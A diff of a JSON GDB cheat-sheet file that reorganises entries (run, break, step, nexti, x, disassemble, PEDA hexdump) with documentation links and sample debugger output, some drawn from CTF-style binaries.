@@ -14,52 +14,153 @@
     ],
     [
       "GDB",
-      "Settings",
-      "",
+      "PEDA",
+      "0",
       "No",
-      "set print pretty on",
-      "Cause GDB to print structures in an indented format with one member per line.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
-      "(gdb) p var1\n$1 = {next = 0x0, flags = {sweet = 1, sour = 1}, meat = 0x54 \"Beef\"}\n\n(gdb) set print pretty on\n(gdb) p var1\n$2 = {\n  next = 0x0,\n  flags = {\n    sweet = 1,\n    sour = 1\n  },\n  meat = 0x54 \"Beef\"\n}"
+      "hexdump \u003caddress\u003e \u003ccount\u003e",
+      "Display hex-view of address content.",
+      "https://github.com/longld/peda\nhttps://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md",
+      "gdb-peda$ hexdump 0x804894c\n0x0804894c : 79 6f 75 72 20 66 6c 61 67 20 69 73 3a 20 70 69   your flag is: pi\ngdb-peda$ hexdump 0x804894c 100\n0x0804894c : 79 6f 75 72 20 66 6c 61 67 20 69 73 3a 20 70 69   your flag is: pi\n0x0804895c : 63 6f 43 54 46 7b 25 73 7d 0a 00 00 01 1b 03 3b   coCTF{%s}......;\n0x0804896c : 48 00 00 00 08 00 00 00 88 fa ff ff 64 00 00 00   H...........d...\n0x0804897c : 53 fc ff ff 88 00 00 00 34 fd ff ff a8 00 00 00   S.......4.......\n0x0804898c : 90 fd ff ff d0 00 00 00 59 fe ff ff f0 00 00 00   ........Y.......\n0x0804899c : 84 fe ff ff 10 01 00 00 b8 fe ff ff 3c 01 00 00   ............\u003c...\n0x080489ac : 18 ff ff ff"
     ],
     [
       "GDB",
-      "Settings",
-      "",
+      "Commands",
+      "0",
       "No",
-      "set print array-indexes on",
-      "Print the index of each element when displaying arrays.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
-      "(gdb) print myArr\n$1 = {1, 2, 3, 4}\n\n(gdb) set print array-indexes on\n\n(gdb) print myArr\n$2 = {[0] = 1, [1] = 2, [2] = 3, [3] = 4}"
+      "printf \"%s\", \u003caddress\u003e",
+      "Print an ASCII string.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Dynamic-Printf.html",
+      "(gdb) printf \"%s\", 0x804894c\nyour flag is: picoCTF{abcde}"
     ],
     [
       "GDB",
-      "Settings",
-      "",
+      "Commands",
+      "1",
       "No",
-      "set output-radix \u003cbase\u003e",
-      "Set the default base for numeric display.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Numbers.html",
-      "(gdb) set output-radix 16 \np my_ctx $1 = {\n  state = STATE_ACTIVE,  \n  state_ctx = {\n    list = 0x0,\n    fd = 0xffffffff\n}\n\n(gdb) set output-radix 10 \np my_ctx $2 = {  \n  state = STATE_ACTIVE,  \n  state_ctx = {\n    list = 0,\n    fd = -1\n}"
+      "gdb \u003cprogram\u003e",
+      "Run program with GDB.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Invoking-GDB.html#Invoking-GDB",
+      "# gdb vuln\nGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from vuln...(no debugging symbols found)...done.\n"
     ],
     [
       "GDB",
-      "Settings",
-      "",
+      "Commands",
+      "2",
       "No",
-      "set print elements \u003cnumber-of-elements\u003e",
-      "Set a limit on how many elements of an array GDB will print.\nDefault is 200. 0 for unlimited.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Print-Settings.html",
-      "(gdb) set print elements 5\n(gdb) p arr\n$1 = {0, 1, 2, 3, 4...}\n\n(gdb) set print elements 0\n(gdb) p arr\n$2 = {0, 1, 2, 3, 4, 5, 6}\n"
+      "gdb \u003cprogram\u003e \u003ccore_dump\u003e",
+      "Open a core dump for a given program with GDB.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Invoking-GDB.html#Invoking-GDB",
+      "# gdb vuln /root/core/core_dump\nGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from vuln...(no debugging symbols found)...done.\n[New LWP 1623]\nCore was generated by `./vuln'.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n#0  0x6161616c in ?? ()"
     ],
     [
       "GDB",
-      "Settings",
-      "",
+      "Commands",
+      "10",
       "No",
-      "dump \u003cbinary\u003e memory \u003cfilename.bin\u003e \u003cstart_addr\u003e \u003cend_addr\u003e",
-      "Dumps a memory range to a file.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Dump_002fRestore-Files.html"
+      "run",
+      "Start your program under GDB. \nAbbreviated r.\n\nTo supply input for the program, use r \u003c input.txt (where input.txt contains input for the standard input of the program)\nAlternatively, use \u003c\u003c\u003c to supply the input using a command, e.g.: r \u003c\u003c\u003c $(python -c 'print \"A\"*257')\n\nUse r arg1 arg2 arg3 to supply command line arguments for the program.\n\n",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Starting.html\nhttps://dustri.org/b/feed-binary-stdin-from-inside-gdb.html",
+      "Reading symbols from /home/a.out...done.\n(gdb) r\nStarting program: /home/a.out \n\nReading symbols from /home/a.out...done.\n(gdb) r \u003c input.txt\nStarting program: /home/a.out  \n\n(gdb) r \u003c\u003c\u003c $(python -c 'print \"A\"*257')\n\n(gdb) r arg1\n\n(gdb) r $(python -c \"print '37a1'.decode('hex')\")"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "20",
+      "No",
+      "quit",
+      "Quit execution.\nAbbreviated q.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Quitting-GDB.html#Quitting-GDB",
+      "(gdb) q\nA debugging session is active.\n                              \n        Inferior 1 [process 26432] will be killed.\n                     \nQuit anyway? (y or n)"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "30",
+      "No",
+      "continue",
+      "Resume program execution, at the address where your program last stopped.\nAbbreviated c.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "Breakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n(gdb) c\nContinuing.\nSum of 4 and 3"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "40",
+      "No",
+      "break \u003cfunction\u003e",
+      "Set breakpoint.\nAbbreviated b.\nUse break \u003cfunction\u003e to set breakpoint using function name.\nUse break *\u003caddress\u003e to set breakpoint using address.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Set-Breaks.html",
+      "(gdb) break sum\nBreakpoint 1 at 0x400572: file main.c, line 18.\n(gdb) r\nStarting program: /home/a.out\n                             \nBreakpoint 1, sum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);\n\n(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) break *0x400552\nBreakpoint 3 at 0x400552: file main.c, line 13.\n(gdb) c\nContinuing.\n           \nBreakpoint 3, 0x0000000000400552 in log (str=0x400674 \"Sum of %d and %d\",\n    param1=4, param2=3) at main.c:13\n13          printf(str, param1, param2);"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "45",
+      "No",
+      "info break",
+      "List breakpoints.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Set-Breaks.html",
+      "(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time                                 \n2       breakpoint     keep y   0x0000000000400596 in main at main.c:25"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "47",
+      "No",
+      "delete \u003cbreakpoint\u003e",
+      "Delete breakpoint.\nAbbreviated d.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Delete-Breaks.html",
+      "(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time                                 \n2       breakpoint     keep y   0x0000000000400596 in main at main.c:25\n(gdb) d 2\n(gdb) info break\nNum     Type           Disp Enb Address            What\n1       breakpoint     keep y   0x0000000000400572 in sum at main.c:18\n        breakpoint already hit 1 time"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "50",
+      "No",
+      "step",
+      "Continue running your program until control reaches a different source line, then stop it and return control to GDB.\nAbbreviated s.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n(gdb) step\nsum (a=4, b=3) at main.c:18\n18          log(\"Sum of %d and %d\\n\", a, b);"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "60",
+      "No",
+      "stepi",
+      "Execute one machine instruction, then stop and return to the debugger.\nAbbreviated si.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "(gdb) nexti\n0x00000000004005d6      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n=\u003e 0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) stepi\nsum (a=0, b=4195917) at main.c:17\n17      {\n=\u003e 0x0000000000400564 \u003csum+0\u003e:  55      push   rbp\n   0x0000000000400565 \u003csum+1\u003e:  48 89 e5        mov    rbp,rsp\n   0x0000000000400568 \u003csum+4\u003e:  48 83 ec 10     sub    rsp,0x10\n   0x000000000040056c \u003csum+8\u003e:  89 7d fc        mov    DWORD PTR [rbp-0x4],edi\n   0x000000000040056f \u003csum+11\u003e: 89 75 f8        mov    DWORD PTR [rbp-0x8],esi"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "70",
+      "No",
+      "next",
+      "Continue to the next source line in the current (innermost) stack frame (step over).\nAbbreviated n.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n(gdb) next\nSum of 4 and 3\n35          s += sum(2, 6);"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "80",
+      "No",
+      "nexti",
+      "Execute one machine instruction, but if it is a function call, proceed until the function returns.\nAbbreviated ni.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n=\u003e 0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n   0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) nexti\n0x00000000004005d1      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n=\u003e 0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n   0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) nexti\n0x00000000004005d6      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n=\u003e 0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "85",
+      "No",
+      "finish",
+      "Continue running until just after function in the selected stack frame returns. Print the returned value (if any).\nAbbreviated fin.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
+      "(gdb) finish\nRun till exit from #0  sum (a=4, b=3) at main.c:18\nSum of 4 and 3\n0x00000000004005db in main () at main.c:34\n34          s = sum(4, 3);\nValue returned is $1 = 7"
     ],
     [
       "GDB",
@@ -70,6 +171,16 @@
       "Print an expression.\nAbbreviated p.\nUse p/x for printing hexadecimal values.\nUse * to dereference variables.\nAppend @[number] to print as an array of [number] elements.",
       "https://sourceware.org/gdb/onlinedocs/gdb/Data.html",
       "(gdb) p i\n$1 = 3\n\n(gdb) p/x i\n$2 = 0x3\n\n(gdb) p arr\n$3 = {0, 1, 2}\n\n(gdb) p pArr\n$4 = (int *) 0x7fffffffeb50\n\np *pArr@3\n$5 = {0, 1, 2}\n\np *pArr\n$6 = 0"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "95",
+      "No",
+      "x /\u003cnfu\u003e \u003caddr\u003e",
+      "Examine memory.\n\nn, f, and u are all optional parameters that specify how much memory to display and how to format it; addr is an expression giving the address where you want to start displaying memory. \n\nn, the repeat count:\n    The repeat count is a decimal integer; the default is 1. It specifies how much memory (counting by units u) to display. \n\nf, the display format:\n    The display format is one of the formats used by print (‘x’, ‘d’, ‘u’, ‘o’, ‘t’, ‘a’, ‘c’, ‘f’, ‘s’), and in addition ‘i’ (for machine instructions). \n\nu, the unit size:\n    b for Bytes, h for Halfwords (two bytes), w for Words (four bytes), g for Giant words (eight bytes). \n",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Memory.html",
+      "(gdb) p &arr\n$2 = (int (*)[40]) 0x7fffffffeac0\n(gdb) x /32xw $2\n0x7fffffffeac0: 0x00000001      0x00000002      0x00000003      0x00000004\n0x7fffffffead0: 0x00000005      0x00000006      0x00000007      0x00000008\n0x7fffffffeae0: 0x00000009      0x0000000a      0x0000000b      0x0000000c\n0x7fffffffeaf0: 0x0000000d      0x0000000e      0x0000000f      0x00000010\n0x7fffffffeb00: 0x00000011      0x00000012      0x00000013      0x00000014\n0x7fffffffeb10: 0x00000015      0x00000016      0x00000017      0x00000018\n0x7fffffffeb20: 0x00000019      0x0000001a      0x0000001b      0x0000001c\n0x7fffffffeb30: 0x0000001d      0x0000001e      0x0000001f      0x00000020\n\n(gdb) x /10xb $2\n0x7fffffffeac0: 0x01    0x00    0x00    0x00    0x02    0x00    0x00    0x00\n0x7fffffffeac8: 0x03    0x00"
     ],
     [
       "GDB",
@@ -104,26 +215,6 @@
     [
       "GDB",
       "Commands",
-      "150",
-      "No",
-      "frame \u003cn\u003e",
-      "Move to a specific frame from the backtrace to view locals or arguments.",
-      "https://sourceware.org/gdb/current/onlinedocs/gdb/Selection.html#Selection",
-      "(gdb) backtrace\n#0  log (str=0x400674 \"Sum of %d and %d\", param1=4, param2=3) at main.c:13\n#1  0x0000000000400584 in sum (a=4, b=3) at main.c:18\n#2  0x00000000004005db in main () at main.c:34\n\n(gdb) frame 2\n#2  0x00000000004005db in main () at main.c:34 \n34  s = sum(4, 3); \n"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "170",
-      "No",
-      "thread \u003cThreadNumber\u003e",
-      "Make thread number ThreadNumber the current thread.\nThe command argument ThreadNumber is the internal gdb thread number, as shown in the first field of the 'info threads' display.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
-      "(gdb) info thread\n  Id   Target Id         Frame\n  2    Thread 0x7ffff77f5700 (LWP 27231) \"a.out\" myThreadFunc (vargp=0x0)\n    at main.c:18\n* 1    Thread 0x7ffff7fe7740 (LWP 27227) \"a.out\" 0x00007ffff7bc566b in pthread_join (threadid=140737345705728, thread_return=0x0) at pthread_join.c:92\n\n(gdb) thread 2\n[Switching to thread 2 (Thread 0x7ffff77f5700 (LWP 27231))]\n#0  myThreadFunc (vargp=0x0) at main.c:18\n18          while(1);"
-    ],
-    [
-      "GDB",
-      "Commands",
       "130",
       "No",
       "list",
@@ -134,22 +225,12 @@
     [
       "GDB",
       "Commands",
-      "160",
+      "135",
       "No",
-      "info threads",
-      "Show current status of all threads in process.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
-      "(gdb) info thread\n  Id   Target Id         Frame\n  2    Thread 0x7ffff77f5700 (LWP 27231) \"a.out\" myThreadFunc (vargp=0x0)\n    at main.c:18\n* 1    Thread 0x7ffff7fe7740 (LWP 27227) \"a.out\" 0x00007ffff7bc566b in pthread_join (threadid=140737345705728, thread_return=0x0) at pthread_join.c:92\n\n(gdb) thread 2\n[Switching to thread 2 (Thread 0x7ffff77f5700 (LWP 27231))]\n#0  myThreadFunc (vargp=0x0) at main.c:18\n18          while(1);"
-    ],
-    [
-      "GDB",
-      "Commands",
-      "",
-      "No",
-      "thread apply all \u003ccommand\u003e",
-      "Apply command to all threads.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
-      "(gdb) thread apply all backtrace\n                                \nThread 2 (Thread 0x7ffff77f5700 (LWP 27231)):\n#0  myThreadFunc (vargp=0x0) at main.c:18\n#1  0x00007ffff7bc4182 in start_thread (arg=0x7ffff77f5700)\n    at pthread_create.c:312\n#2  0x00007ffff78f130d in clone ()\n    at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n                               \nThread 1 (Thread 0x7ffff7fe7740 (LWP 27227)):\n#0  0x00007ffff7bc566b in pthread_join (threadid=140737345705728,\n    thread_return=0x0) at pthread_join.c:92\n#1  0x00000000004006e4 in main () at main.c:26"
+      "disassemble",
+      "Show disassembly.\nAbbreviated disas.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Machine-Code.html",
+      "(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) break *0x400552\nBreakpoint 3 at 0x400552: file main.c, line 13.\n(gdb) c\nContinuing.\n           \nBreakpoint 3, 0x0000000000400552 in log (str=0x400674 \"Sum of %d and %d\",\n    param1=4, param2=3) at main.c:13\n13          printf(str, param1, param2);\n\n(gdb) p/x *0x0804A024\n$1 = 0x8048476\n(gdb) disas $1,+10\nDump of assembler code from 0x8048476 to 0x8048480:\n   0x08048476 \u003cexit@plt+6\u003e:\tpush   0x30\n   0x0804847b \u003cexit@plt+11\u003e:\tjmp    0x8048400\nEnd of assembler dump."
     ],
     [
       "GDB",
@@ -164,142 +245,42 @@
     [
       "GDB",
       "Commands",
-      "135",
+      "150",
       "No",
-      "disassemble",
-      "Show disassembly.\nAbbreviated disas.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Machine-Code.html",
-      "(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) break *0x400552\nBreakpoint 3 at 0x400552: file main.c, line 13.\n(gdb) c\nContinuing.\n           \nBreakpoint 3, 0x0000000000400552 in log (str=0x400674 \"Sum of %d and %d\",\n    param1=4, param2=3) at main.c:13\n13          printf(str, param1, param2);\n\n(gdb) p/x *0x0804A024\n$1 = 0x8048476\n(gdb) disas $1,+10\nDump of assembler code from 0x8048476 to 0x8048480:\n   0x08048476 \u003cexit@plt+6\u003e:\tpush   0x30\n   0x0804847b \u003cexit@plt+11\u003e:\tjmp    0x8048400\nEnd of assembler dump."
-    ],
-    [
-      "GDB",
-      "Settings",
-      "",
-      "No",
-      "set disassembly-flavor intel",
-      "Set disassemmbly syntax to Intel style.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Machine-Code.html",
-      "(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   %rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    %rsp,%rbp\n   0x000000000040053a \u003c+4\u003e:     sub    $0x10,%rsp\n   0x000000000040053e \u003c+8\u003e:     mov    %rdi,-0x8(%rbp)\n   0x0000000000400542 \u003c+12\u003e:    mov    %esi,-0xc(%rbp)\n   0x0000000000400545 \u003c+15\u003e:    mov    %edx,-0x10(%rbp)\n=\u003e 0x0000000000400548 \u003c+18\u003e:    mov    -0x10(%rbp),%edx\n   0x000000000040054b \u003c+21\u003e:    mov    -0xc(%rbp),%ecx\n   0x000000000040054e \u003c+24\u003e:    mov    -0x8(%rbp),%rax\n   0x0000000000400552 \u003c+28\u003e:    mov    %ecx,%esi\n   0x0000000000400554 \u003c+30\u003e:    mov    %rax,%rdi\n   0x0000000000400557 \u003c+33\u003e:    mov    $0x0,%eax\n   0x000000000040055c \u003c+38\u003e:    callq  0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leaveq\n   0x0000000000400563 \u003c+45\u003e:    retq\nEnd of assembler dump.\n(gdb) set disassembly-flavor intel\n(gdb) disas\nDump of assembler code for function log:\n   0x0000000000400536 \u003c+0\u003e:     push   rbp\n   0x0000000000400537 \u003c+1\u003e:     mov    rbp,rsp\n   0x000000000040053a \u003c+4\u003e:     sub    rsp,0x10\n   0x000000000040053e \u003c+8\u003e:     mov    QWORD PTR [rbp-0x8],rdi\n   0x0000000000400542 \u003c+12\u003e:    mov    DWORD PTR [rbp-0xc],esi\n   0x0000000000400545 \u003c+15\u003e:    mov    DWORD PTR [rbp-0x10],edx\n   0x0000000000400548 \u003c+18\u003e:    mov    edx,DWORD PTR [rbp-0x10]\n   0x000000000040054b \u003c+21\u003e:    mov    ecx,DWORD PTR [rbp-0xc]\n   0x000000000040054e \u003c+24\u003e:    mov    rax,QWORD PTR [rbp-0x8]\n=\u003e 0x0000000000400552 \u003c+28\u003e:    mov    esi,ecx\n   0x0000000000400554 \u003c+30\u003e:    mov    rdi,rax\n   0x0000000000400557 \u003c+33\u003e:    mov    eax,0x0\n   0x000000000040055c \u003c+38\u003e:    call   0x400410 \u003cprintf@plt\u003e\n   0x0000000000400561 \u003c+43\u003e:    nop\n   0x0000000000400562 \u003c+44\u003e:    leave\n   0x0000000000400563 \u003c+45\u003e:    ret\nEnd of assembler dump. "
+      "frame \u003cn\u003e",
+      "Move to a specific frame from the backtrace to view locals or arguments.",
+      "https://sourceware.org/gdb/current/onlinedocs/gdb/Selection.html#Selection",
+      "(gdb) backtrace\n#0  log (str=0x400674 \"Sum of %d and %d\", param1=4, param2=3) at main.c:13\n#1  0x0000000000400584 in sum (a=4, b=3) at main.c:18\n#2  0x00000000004005db in main () at main.c:34\n\n(gdb) frame 2\n#2  0x00000000004005db in main () at main.c:34 \n34  s = sum(4, 3); \n"
     ],
     [
       "GDB",
       "Commands",
-      "70",
+      "160",
       "No",
-      "next",
-      "Continue to the next source line in the current (innermost) stack frame (step over).\nAbbreviated n.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n(gdb) next\nSum of 4 and 3\n35          s += sum(2, 6);"
+      "info threads",
+      "Show current status of all threads in process.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Threads.html",
+      "(gdb) info thread\n  Id   Target Id         Frame\n  2    Thread 0x7ffff77f5700 (LWP 27231) \"a.out\" myThreadFunc (vargp=0x0)\n    at main.c:18\n* 1    Thread 0x7ffff7fe7740 (LWP 27227) \"a.out\" 0x00007ffff7bc566b in pthread_join (threadid=140737345705728, thread_return=0x0) at pthread_join.c:92\n\n(gdb) thread 2\n[Switching to thread 2 (Thread 0x7ffff77f5700 (LWP 27231))]\n#0  myThreadFunc (vargp=0x0) at main.c:18\n18          while(1);"
     ],
     [
       "GDB",
       "Commands",
-      "80",
+      "165",
       "No",
-      "nexti",
-      "Execute one machine instruction, but if it is a function call, proceed until the function returns.\nAbbreviated ni.",
-      "https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html",
-      "Breakpoint 1, main () at main.c:34\n34          s = sum(4, 3);\n=\u003e 0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n   0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) nexti\n0x00000000004005d1      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n=\u003e 0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n   0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax\n(gdb) nexti\n0x00000000004005d6      34          s = sum(4, 3);\n   0x00000000004005cc \u003cmain+62\u003e:        be 03 00 00 00  mov    esi,0x3\n   0x00000000004005d1 \u003cmain+67\u003e:        bf 04 00 00 00  mov    edi,0x4\n=\u003e 0x00000000004005d6 \u003cmain+72\u003e:        e8 89 ff ff ff  call   0x400564 \u003csum\u003e\n   0x00000000004005db \u003cmain+77\u003e:        89 45 e4        mov    DWORD PTR [rbp-0x1c],eax"
+      "thread apply all \u003ccommand\u003e",
